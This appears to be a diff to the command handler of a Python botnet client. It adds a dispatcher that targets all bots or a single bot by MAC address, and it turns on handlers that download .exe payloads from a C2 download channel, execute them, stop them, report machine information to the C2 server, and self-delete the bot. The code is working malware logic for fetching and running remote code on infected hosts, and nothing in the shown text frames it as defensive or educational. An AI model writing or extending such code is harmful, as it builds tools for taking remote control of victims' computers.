@@ -13,7 +13,6 @@ from bots.ExecutingProgramHandler import ExecutingProgramHandler
 from bots.NotificationBuilder import NotificationBuilder
 
 # Import Dictionaries
-from bots.dictionaries.NotficationEvents import Events
 from bots.dictionaries.CommunicationChannels import CommChannels
 
 
@@ -30,7 +29,7 @@ class CommandHandler:
 
 
     # Download the payload from a specified URL and save it to the bot's system
-    def __download_payload(self, id: str):
+    def __download_payload(self, id: str, params: list):
         payloadURL = CommChannels["DOWNLOAD_CHANNEL"] + f"/{id}.exe"
         outputFile = f"payloads/{id}.exe"
 
@@ -48,7 +47,7 @@ class CommandHandler:
 
 
     # Execute the payload on the bot's system, handle any errors that may occur during execution
-    def __executePayload(self, id: str):
+    def __executePayload(self, id: str, params: list):
         print("Executing Payload...")
         payload_name = f"payloads/{id}.exe"
         self.exeHandler.add_program(subprocess.Popen(payload_name, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP))
@@ -56,12 +55,12 @@ class CommandHandler:
 
 
     # Stop any running payloads
-    def __stopPayload(self):
+    def __stopPayload(self, id: str, params: list):
         self.exeHandler.stop_all_programs()
 
 
     # Announce bot status to C2 server
-    def __announce_status(self):
+    def __announce_status(self, id: str, params: list):
         print("Announcing status to C2 server...")
 
         mInfo = self.machineInfo.get_machine_info()
@@ -107,17 +106,30 @@ class CommandHandler:
         # Stop bot
         self.bot.quit = True
 
-    # Handle status request, if params is None or matches the bot's MAC address, announce status to C2 server
-    def __handle_status_request(self, id, params):
-        if params != None:
-            MACADDR = params[0]
 
-        if id == None:
-            self.__announce_status()
-        elif MACADDR == self.machineInfo.MAC_ADDR:
-            self.__announce_status()
+    # Take all necesarry steps so safely remove the bots program
+    def __handle_remove(self, id, params):
+        self.__stopPayload(id, params)
+        self.__cleanupPayloads()
+        self.__schedule_self_delete()
+
+
+    # Uniformly handle "for all" or "for me" command executions
+    def __handle_general(self, func, id: str, params: list):
+        IS_FOR_ALL = (params == [])
+        IS_FOR_ME = False
+
+        if (not IS_FOR_ALL):
+            IS_FOR_ME = self.machineInfo.MAC_ADDR == params[0]
+        
+        if IS_FOR_ALL:
+            print("FOR ALL")
+            func(id, params)
+        elif IS_FOR_ME:
+            print("FOR ME")
+            func(id, params)
         else:
-            pass
+            pass        
 
     # Handle commands received from C2 server
     def handle_command(self, cmd_tuple):
@@ -127,16 +139,14 @@ class CommandHandler:
         print(f"Handling command: {cmd}, id: {id}, params: {params}")
 
         if cmd == Command.STATUS:
-            self.__handle_status_request(id, params)
-        # elif cmd == Command.PAYLOAD:
-        #     self.__download_payload(id)
-        # elif cmd == Command.EXECUTE:
-        #     self.__executePayload(id)
-        # elif cmd == Command.STOP:
-        #     self.__stopPayload()
+            self.__handle_general(self.__announce_status, id, params)
+        elif cmd == Command.PAYLOAD:
+            self.__handle_general(self.__download_payload, id, params)
+        elif cmd == Command.EXECUTE:
+            self.__handle_general(self.__executePayload, id, params)
+        elif cmd == Command.STOP:
+            self.__handle_general(self.__stopPayload, id, params)
         # elif cmd == Command.REMOVE:
-        #     self.__stopPayload()
-        #     self.__cleanupPayloads()
-        #     self.__schedule_self_delete()
+        #     self.__handle_general(self.__handle_remove, id, params)
         else:
             print ("Received unknown command, ignoring...")
